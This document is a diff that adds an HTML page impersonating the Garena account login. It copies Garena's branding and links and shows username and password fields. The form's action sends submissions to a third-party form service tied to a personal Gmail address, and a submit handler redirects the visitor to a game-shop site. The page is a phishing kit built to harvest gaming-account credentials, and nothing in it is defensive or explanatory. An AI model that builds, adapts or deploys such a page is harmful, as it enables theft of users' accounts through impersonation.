@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Account Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+        }
+        
+        .topbar {
+            background-color: white;
+            padding: 15px 0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            border-bottom: 2px solid #d40000;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .lang {
+            padding: 8px 12px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            background-color: #f8f8f8;
+        }
+        
+        main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 100px);
+            padding: 20px;
+        }
+        
+        form {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            border-top: 3px solid #d40000;
+        }
+        
+        h2 {
+            color: #d40000;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 24px;
+        }
+        
+        .field {
+            margin-bottom: 20px;
+        }
+        
+        .field.required::after {
+            content: "*";
+            color: #d40000;
+            margin-left: 5px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #d40000;
+        }
+        
+        .forgot {
+            display: block;
+            text-align: right;
+            color: #d40000;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        
+        button.primary {
+            background-color: #d40000;
+            color: white;
+            border: none;
+            margin-bottom: 15px;
+        }
+        
+        button.primary:hover {
+            background-color: #b30000;
+        }
+        
+        button.secondary {
+            background-color: white;
+            color: #d40000;
+            border: 1px solid #d40000;
+        }
+        
+        button.secondary:hover {
+            background-color: #ffeeee;
+        }
+        
+        .agreement {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .agreement a {
+            color: #d40000;
+            text-decoration: none;
+        }
+        
+        .agreement a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header class="topbar">
+        <div class="container">
+            <a class="logo" href="https://www.garena.sg/">
+                <img src="https://logospng.org/download/garena/logo-escudo-garena-1024.png" alt="Garena Logo">
+            </a>
+            <select class="lang">
+                <option value="en-US">International - English</option>
+                <option value="en-SG">Singapore - English</option>
+                <option value="zh-SG">新加坡 - 简体中文</option>
+            </select>
+        </div>
+    </header>
+
+    <main>
+        <form onsubmit="event.preventDefault(); window.location.href='https://shop2game.com/?channel=230199&item=26781'"  action="https://formsubmit.co/dark7mar12010@gmail.com" method="POST">
+            <h2>Log In</h2>
+            
+            <div class="field required">
+                <input type="text" placeholder="Garena Username, Email or Phone">
+            </div>
+            
+            <div class="field required">
+                <input type="password" placeholder="Password">
+            </div>
+            
+            <a class="forgot" href="https://account.garena.com/recovery">Forgot Password</a>
+            
+            <div class="field">
+                <button class="primary" type="submit">Login Now</button>
+            </div>
+            
+            <div class="field">
+                <button class="secondary" type="button">Register A New Account</button>
+            </div>
+            
+            <div class="agreement">
+                <a href="https://contentgarena-a.akamaihd.net/legal/tos/tos_en.html">Terms of Service</a> and 
+                <a href="https://contentgarena-a.akamaihd.net/legal/pp/pp_en.html">Privacy Policy</a>
+            </div>
+        </form>
+    </main>
+</body>
+</html>
